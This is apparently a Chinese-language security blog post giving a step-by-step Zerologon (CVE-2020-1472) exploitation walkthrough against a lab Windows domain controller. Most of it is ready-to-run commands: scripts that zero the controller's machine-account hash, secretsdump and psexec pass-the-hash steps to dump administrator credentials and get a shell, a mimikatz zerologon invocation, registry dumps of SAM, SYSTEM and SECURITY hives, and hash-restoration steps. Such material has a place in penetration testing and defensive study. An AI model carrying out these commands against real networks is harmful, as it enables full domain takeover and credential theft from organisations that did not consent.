**目录**

[背景](#t0 "背景")

[impacket攻击](#t1 "impacket攻击")

[挂socks5代理打](#t2 "挂socks5代理打")

[使用mimikatz攻击](#t3 "使用mimikatz攻击")

[恢复域控的机器用户哈希](#t4 "恢复域控的机器用户哈希")

[获得域控机器账号原始哈希](#t5 "获得域控机器账号原始哈希")

[方式一 ：](#t6 "方式一 ：")

[方式二：](#t7 "方式二：")

[恢复域控原始哈希](#t8 "恢复域控原始哈希")

* * *

背景
==

在2020年8月份微软公布的安全公告中，有一个十分紧急的漏洞——CVE-2020-1472 NetLogon 权限提升漏洞。通过该漏洞，未经身份的验证者只需要能访问到域控的135端口即可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器并重置域控的机器账号的[哈希](https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020)，从而导致攻击者可以通过域控的机器账号导出域内的所有用户哈希(域控的机器账号具有Dcsync权限，使用Dcsync导出域内哈希，需要域控开启445端口)，进而接管整个域。

所以这个漏洞完整的利用，需要域控开启**135**和**445**端口。

**impacket攻击**

先执行如下命令判断域控是否存在该漏洞

```
python3 zerologon_tester.py win2008 192.168.10.131
```


![](https://img-blog.csdnimg.cn/20201012161345123.png)

该脚本会将域控的机器账号哈希置为空

```
#查询域控的机器用户哈希      
./secretsdump.py xie.com/administrator:password@192.168.10.131 -just-dc-user "win2008$"       
#攻击，使域控的机器账号哈希置为空      
python3 CVE-2020-1472.py win2008 win2008$ 192.168.10.131       
#再次查询域控的机器用户哈希，可以看到，已经变为空了      
./secretsdump.py xie.com/administrator:password@192.168.10.131 -just-dc-user "win2008$"
```


![](https://img-blog.csdnimg.cn/20201012161428171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
#使用机器账号，哈希为空连接，导出administrator用户的哈希      
./secretsdump.py "xie/win2008$"@192.168.10.131 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user "administrator"      
#然后用administrator用户的哈希连接域控      
./psexec.py xie/administrator@192.168.10.131 -hashes aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc
```


 ![](https://img-blog.csdnimg.cn/20201012161511903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

挂socks5代理打
==========

```
proxychains4 -q python3 CVE-2020-1472.py win2008 win2008$ 192.168.10.131
```


![](https://img-blog.csdnimg.cn/20201012161604695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用mimikatz攻击
============

```
#如果当前主机在域环境中，则target这里可以直接使用FQDN      
lsadump::zerologon /target:win2008.xie.com /ntlm /null /account:win2008$ /exploit      
​      
#如果当前主机不在域环境中，则target这里可以直接指定ip      
lsadump::zerologon /target:192.168.10.131 /ntlm /null /account:win2008$ /exploit
```


 ![](https://img-blog.csdnimg.cn/20201012161717634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

攻击机不在域环境中时

![](https://img-blog.csdnimg.cn/20201012161804683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

恢复域控的机器用户哈希
===========

在攻击成功后，一定要恢复域控的机器用户的原始哈希，不然有可能域控重启会出现无法开机等情况！

获得域控机器账号原始哈希
------------

### 方式一 ：

利用secretsdump.py调用自带的-use-vss 参数，即可启动卷影复制服务volume shadow copy （VSS）,从而获得计算机原始的哈希

```
./secretsdump.py "xie/win2008$"@192.168.10.131 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -use-vss
```


![](https://img-blog.csdnimg.cn/20201012161849495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方式二：

```
reg save HKLM\SYSTEM system.save      
reg save HKLM\SAM sam.save      
reg save HKLM\SECURITY security.save
```


![](https://img-blog.csdnimg.cn/20201012161921532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将刚刚保存的三个文件放到`impacket`的`examples`目录下，执行如下命令。如下，`$MACHINE.ACC`后面的就是原来的机器哈希

```
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```


![](https://img-blog.csdnimg.cn/20201012161941304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

恢复域控原始哈希
--------

该脚本比较暴力，再打一次，计算密码的时候使用了空密码的hash去计算session\_key。 直接使用机器账号的原始NTLM哈希即可还原，执行如下命令恢复：

```
python3 reinstall_original_pw.py win2008 192.168.10.131 d0aeb0472d4400ec08b2f9fe8ed17655
```


![](https://img-blog.csdnimg.cn/20201012162010762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者直接在域控上执行该命令， 该命令一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。 重置后的密码跟之前的密码不一样

```
powershell Reset-ComputerMachinePassword
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[ZeroLogon的利用以及分析](https://mp.weixin.qq.com/s/S9Hwb1-lLhh4QfI4b551SQ "ZeroLogon的利用以及分析")

                 [CVE-2020-1472 NetLogon 权限提升漏洞研究](https://mp.weixin.qq.com/s/CBMchx7hLO8YovcEnWM2IQ "CVE-2020-1472 NetLogon 权限提升漏洞研究")